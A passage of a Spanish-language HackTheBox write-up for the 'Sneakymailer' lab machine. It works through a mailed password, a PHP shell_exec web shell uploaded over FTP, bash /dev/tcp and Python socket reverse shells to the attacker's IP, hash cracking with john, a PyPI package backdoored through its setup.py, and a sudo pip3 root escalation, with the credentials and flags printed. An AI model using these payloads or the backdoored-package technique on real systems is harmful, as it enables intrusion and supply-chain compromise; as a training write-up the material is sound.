+l&gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=
+al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=
+t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=
+
+--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
+)
+a7 OK FETCH completed.
+</code></pre>
+
+<p>Como ahora disponemos de credenciales nuevas:</p>
+
+<ul>
+  <li><code>developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code></li>
+</ul>
+
+<p>Volemos a tratar de conectarnos por <code>ftp</code> y esta vez la conexión es exitosa.</p>
+
+<pre><code class="language-bash">❯ ftp 10.10.10.197
+Connected to 10.10.10.197.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.197:fmiracle): developer
+331 Please specify the password.
+Password:
+230 Login successful.
+
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; 
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxr-x    8 0        1001         4096 Jun 30  2020 dev
+226 Directory send OK.
+ftp&gt; cd dev
+250 Directory successfully changed.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 May 26  2020 css
+drwxr-xr-x    2 0        0            4096 May 26  2020 img
+-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
+drwxr-xr-x    3 0        0            4096 May 26  2020 js
+drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
+drwxr-xr-x    4 0        0            4096 May 26  2020 scss
+-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
+drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
+226 Directory send OK.
+ftp&gt;
+</code></pre>
+
+<p>Despues de conectarnos visualizamos un directorio <code>dev</code> y dentro un contenido de nombre <code>team.php</code>, que curiosamente era la ruta de la pagina donde estaban expuestos los correos.</p>
+
+<p>Para poder saber si tenemos permiso de escritura intentaremos subir un archivo de nombre <code>cmd.php</code> que con el uso de la función <code>shell_exec</code> me ejecute un comando a nivel de sistema que vamos a controlar con el parametro <code>cmd</code></p>
+
+<pre><code class="language-php">&lt;?php
+    echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;";
+?&gt;
+</code></pre>
+
+<p>Comprobamos que efectivamente si podemos subir el archivo</p>
+
+<pre><code class="language-bash">ftp&gt; put cmd.php
+local: cmd.php remote: cmd.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+d226 Transfer complete.
+69 bytes sent in 0.00 secs (811.8411 kB/s)
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+--wxrw-rw-    1 1001     1001           69 Apr 08 19:15 cmd.php
+drwxr-xr-x    2 0        0            4096 May 26  2020 css
+drwxr-xr-x    2 0        0            4096 May 26  2020 img
+-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
+drwxr-xr-x    3 0        0            4096 May 26  2020 js
+drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
+drwxr-xr-x    4 0        0            4096 May 26  2020 scss
+-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
+drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
+226 Directory send OK.
+ftp&gt;
+</code></pre>
+
+<p>Visitamos la <code>url</code>, pero esta vez apuntaremos al fichero que subimos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Sneakymailer/sneaky3.PNG" alt="" /></p>
+
+<p>El servicio nos reporta un codigo de estado <code>400</code> lo que corresponde a que el archivo no existe…</p>
+
+<p>Pero dado a que existe un directorio <code>dev</code> podemos pensar que puede ser un posible subdominio, asi que usaremos <code>gobuster</code> para tratar de enumerar posibles subdominios validos existentes y usaremos el diccionario <code>subdomains-top1million-5000.txt</code> del repositorio de <code>seclists</code></p>
+
+<ul>
+  <li><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
+  <li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://sneakycorp.htb/ -t 200
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://sneakycorp.htb/
+[+] Method:       GET
+[+] Threads:      200
+[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2023/04/08 23:21:48 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
+                                                     
+===============================================================
+2023/04/08 23:21:58 Finished
+===============================================================
+</code></pre>
+
+<p>Pues <code>gobuster</code> nos reporta que el subdominio es valido, lo que quiere decir que el archivo que subimos antes existe, pero bajo ese subdominio.</p>
+
+<p>Procedemos a subir nuevamente el archivo ya que a intervalos de tiempo nos lo borra</p>
+
+<pre><code class="language-bash">ftp&gt; put cmd.php
+local: cmd.php remote: cmd.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+69 bytes sent in 0.00 secs (990.9237 kB/s)
+ftp&gt;
+</code></pre>
+
+<p>Volvemos a visitar la <code>url</code> esta vez apuntando al subdominio y al archivo subido no sin antes agregar el subdominio a nuestro <code>/etc/hosts</code></p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.197 dev.sneakycorp.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Esta vez si podemos apuntar al archivo <code>cmd.php</code> y con el parametro <code>cmd</code> tal y como lo habiamos especificado, podemos ejecutar comandos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Sneakymailer/sneaky4.PNG" alt="" /></p>
+
+<p>Lo siguiente sera ganar acceso a la maquina, mandandonos una shell reversa a nuestra maquina local, ello lo haremos con <code>bash</code> con el comando <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1'</code></p>
+
+<p>No olvidemos poner los <code>&amp;</code> en urleconde <code>%26</code> para evitar problemas, y enviamos la petición</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Sneakymailer/sneaky5.PNG" alt="" /></p>
+
+<p>Nos ponemos en escucha y recimos la conexión como el usuario <code>www-data</code></p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.197.
+Ncat: Connection from 10.10.10.197:37818.
+bash: cannot set terminal process group (734): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ whoami
+whoami
+www-data
+</code></pre>
+
+<p>Como siempre al ser una maquina <code>linux</code> hacemos un tratamiento de la <code>tty</code> para que sea full interactiva y ajustamos el tamaño de las proporciones de la pantall.</p>
+
+<pre><code class="language-bash">www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm
+www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export SHELL=bash
+www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ stty rows 48 columns 184
+</code></pre>
+
+<p>Una vez en la maquina listamos los procesos corriendo y vemos uno correspondiente a <code>pypi</code></p>
+
+<pre><code class="language-bash">www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ps -faux | grep 5000
+www-data  7185  0.0  0.0   3084   824 pts/0    S+   19:49   0:00  |                           \_ grep 5000
+pypi       741  0.0  0.6  36804 25824 ?        Ss   17:09   0:08 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
+www-data@sneakymailer:~/dev.sneakycorp.htb/dev$
+</code></pre>
+
+<p>Podemos ver que se establece un tipo de conexión procediente de un archivo asi que procederemos a leeerlo</p>
+
+<pre><code class="language-bash">www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /var/www/pypi.sneakycorp.htb/.htpasswd
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+</code></pre>
+
+<p>Vemos una contraseña encryptada que procederemos a crackearla por fuerza bruta con <code>john</code></p>
+
+<pre><code class="language-bash">❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+soufianeelhaoui  (?)
+1g 0:00:00:08 DONE (2023-04-08 23:53) 0.1172g/s 419023p/s 419023c/s 419023C/s soulfire1..souderton16
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Obtenemos nuevas credenciales <code>pypi:soufianeelhaoui</code></p>
+
+<p>Como vimos que por detras esta configurado un <code>nginx</code> vamos a listar los sitios disponibles del directorio <code>sites-available</code></p>
+
+<p>Encotramos el subdominio <code>pypi.sneakycorp.htb</code> que esta en escucha por el puerto <code>8080</code></p>
+
+<pre><code class="language-bash">www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /etc/nginx/sites-available/pypi.sneakycorp.htb 
+server {
+	listen 0.0.0.0:8080 default_server;
+	listen [::]:8080 default_server;
+	server_name _;
+}
+
+
+server {
+	listen 0.0.0.0:8080;
+	listen [::]:8080;
+
+	server_name pypi.sneakycorp.htb;
+
+	location / {
+		proxy_pass http://127.0.0.1:5000;
+		proxy_set_header Host $host;
+		proxy_set_header X-Real-IP $remote_addr;
+	}
+}
+</code></pre>
+
+<p>Agregamos el subdominio al <code>/etc/hosts</code></p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.197 pypi.sneakycorp.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Lo abrimos en el navegador</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Sneakymailer/sneaky6.PNG" alt="" /></p>
+
+<p>Como vemos un <code>pypi server</code> lo que podriamos hacer es tratar de crearnos nuestro propio paquete malicioso de <code>pypi</code> y tratar de subirlo a la maquina victima e intentar colar un comando en la maquina victima.</p>
+
+<p>Ahora la pregunta es como creamos un paquete en python?</p>
+
+<p>Solo debes seguir la guia de este recurso donde se explica a detalle como hacerlo</p>
+
+<ul>
+  <li><a href="https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/">https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/</a></li>
+</ul>
+
+<p>La estructura al crear un paquete debe ser similar a esta:</p>
+
+<pre><code class="language-python">linode_example/
+    linode_example/
+        __init__.py
+    setup.py
+    setup.cfg
+    README.md
+</code></pre>
+
+<p>Entonces procederemos a crear una estructura similar en nuestra maquina en este caso pondre de nombre a los directorios como <code>package</code></p>
+
+<pre><code class="language-bash">❯ ls
+ package   setup.cfg   setup.py
+❯ tree
+.
+├── package
+│   ├── __init__.py
+│   └── package
+├── setup.cfg
+└── setup.py
+
+2 directories, 3 files
+</code></pre>
+
+<p>Lo siguiente sera editar el <code>setup.py</code>, donde ademas añadiremos un codigo para ejecutarnos una <code>reverse shell</code> que se ejecutara cuando se inicie el <code>setup.py</code></p>
+
+<pre><code class="language-python">from setuptools import setup
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.16.2",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+setup(
+    name='linode_example',
+    #packages=['linode_example'],
+    description='Hello world enterprise edition',
+    version='0.1',
+    url='http://github.com/example/linode_example',
+    author='Linode',
+    author_email='docs@linode.com',
+    keywords=['pip','linode','example']
+    )
+</code></pre>
+
+<p>Comentar o borrar la linea de <code>packages=['linode_example']</code> ya que suele dar problema.</p>
+
+<p>Ahora lo que tenemos que hacer es que el servidor de la maquina victima al momento de instalar el paquete me ejecute la <code>reverse shell</code> y eso lo hariamos creando un archivo <code>.pypirc</code> donde definamos cual es el repositorio al cual te quieras conectar y las credenciales de autenticación que de antes la tenemos.</p>
+
+<pre><code class="language-bash">❯ /bin/cat ~/.pypirc
+[distutils]
+index-servers = sneakypwned
+[sneakypwned]
+repository: http://pypi.sneakycorp.htb:8080/
+username: pypi
+password: soufianeelhaoui
+</code></pre>
+
+<p>Por ultimo sera ejecutar el siguiente comando para tratar de cargar el paquete en la maquina victima <code>python3 setup.py sdist upload -r linode</code></p>
+
+<p>Donde reeemplazaremos <code>linode</code> por el nombre que pusimos el el <code>index-servers</code> en el <code>.pypirc</code> que en nuestro caso es sneakypwned</p>
+
+<pre><code class="language-python3">python3 setup.py sdist upload -r sneakypwned
+</code></pre>
+
+<p>Ejecutamos el <code>setup.py</code> y nos ponemos en escucha con <code>ncat</code></p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.16.2.
+Ncat: Connection from 10.10.16.2:46076.
+# whoami
+root
+# pwd
+/home/fmiracle/Machines/Sneakymailer/content/create
+#
+</code></pre>
+
+<p>Pero vemos que nos hace una conexión a nuestra propia maquina, esto es por que primero se ejecuta la conexión locamente</p>
+
+<p>Lo que debemos hacer es volver a ponernos en escucha con <code>ncat</code> y salir de nuestra conexión local con un <code>exit</code> esto hara que se ejecute la conexión esta vez de la maquina victima.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.16.2.
+Ncat: Connection from 10.10.16.2:37168.
+# whoami
+root
+# pwd
+/home/fmiracle/Machines/Sneakymailer/content/create
+# exit
+running sdist
+running egg_info
+writing linode_example.egg-info/PKG-INFO
+writing dependency_links to linode_example.egg-info/dependency_links.txt
+writing top-level names to linode_example.egg-info/top_level.txt
+reading manifest file 'linode_example.egg-info/SOURCES.txt'
+writing manifest file 'linode_example.egg-info/SOURCES.txt'
+warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
+
+running check
+creating linode_example-0.1
+creating linode_example-0.1/linode_example.egg-info
+creating linode_example-0.1/package
+copying files to linode_example-0.1...
+copying setup.cfg -&gt; linode_example-0.1
+copying setup.py -&gt; linode_example-0.1
+copying linode_example.egg-info/PKG-INFO -&gt; linode_example-0.1/linode_example.egg-info
+copying linode_example.egg-info/SOURCES.txt -&gt; linode_example-0.1/linode_example.egg-info
+copying linode_example.egg-info/dependency_links.txt -&gt; linode_example-0.1/linode_example.egg-info
+copying linode_example.egg-info/top_level.txt -&gt; linode_example-0.1/linode_example.egg-info
+copying package/__init__.py -&gt; linode_example-0.1/package
+Writing linode_example-0.1/setup.cfg
+Creating tar archive
+removing 'linode_example-0.1' (and everything under it)
+running upload
+Submitting dist/linode_example-0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
+Server response (200): OK
+</code></pre>
+
+<p>Recibimos la conexión desde la maquina victima como el usuario <code>low</code></p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.197.
+Ncat: Connection from 10.10.10.197:45570.
+$ whoami
+low
+$ hostname -I
+10.10.10.197 dead:beef::250:56ff:feb9:6b16 
+</code></pre>
+
+<p>Realizamos nuevamente un tratamiento de la <code>tty</code> como ya hicimos anteriormente, nos dirigimos al directorio personal del usuario y podemos visualizar la primera flag <code>user.txt</code></p>
+
+<pre><code class="language-bash">low@sneakymailer:/$ cd /home
+low@sneakymailer:/home$ ls
+low  vmail
+low@sneakymailer:/home$ cd low/
+low@sneakymailer:~$ cat user.txt 
+4a39c61b14f3e1c7c83014390f90942e
+low@sneakymailer:~$ 
+</code></pre>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Ejecutamos el comando <code>sudo -l</code> para ver si tenemos privilegios a nivel de <code>sudoers</code> y vemos que tenemos uno asociado al comando <code>pip3</code> el cual podemos ejecutar como <code>root</code> de forma temporal sin requerir contraseña.</p>
+
+<pre><code class="language-bash">low@sneakymailer:~$ sudo -l
+sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Matching Defaults entries for low on sneakymailer:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User low may run the following commands on sneakymailer:
+    (root) NOPASSWD: /usr/bin/pip3
+</code></pre>
+
+<p>Lo siguiente sera dirigirnos a nuestra web de confianza</p>
+
+<ul>
+  <li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
+</ul>
+
+<p>ahi podemos ver que si tenemos el privilegio de sudo en <code>pip3</code>, debemos ejecutar los siguentes comandos y nos convertiremos en el usuario <code>root</code></p>
+
+<pre><code class="language-bash">low@sneakymailer:~$ TF=$(mktemp -d)
+low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+low@sneakymailer:~$ sudo pip install $TF
+sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+[sudo] password for low: 
+low@sneakymailer:~$ TF=$(mktemp -d)
+low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+low@sneakymailer:~$ sudo pip3 install $TF
+sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Processing /tmp/tmp.25RDYk7IwK
+# whoami
+root
+</code></pre>
+
+<p>Finalmente podemos dirigirnos al directorio de <code>root</code> y visualizar la segunda flag <code>root.txt</code> :)</p>
+
+<pre><code class="language-bash"># cd /root
+# cat root.txt
+25ae2132a2ff299928b234e186ad53ec
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina - Sneakymailer&url=http://localhost:4000/hackthebox/htb-writeup-Sneakymailer" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
